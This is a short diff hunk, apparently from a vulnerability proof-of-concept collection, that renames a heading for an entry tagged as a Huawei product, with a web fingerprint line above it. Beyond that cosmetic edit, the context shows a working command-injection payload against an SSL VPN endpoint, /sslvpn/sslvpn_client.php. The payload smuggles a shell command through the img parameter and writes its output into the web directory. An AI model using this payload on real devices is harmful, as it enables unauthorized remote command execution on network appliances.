@@ -23,7 +23,7 @@ HUAWEI-公司产品
 body="/webui/images/default/default/alert_close.jpg"
 ```
 
-## poc
+## POC
 ```
 /sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt
 ```
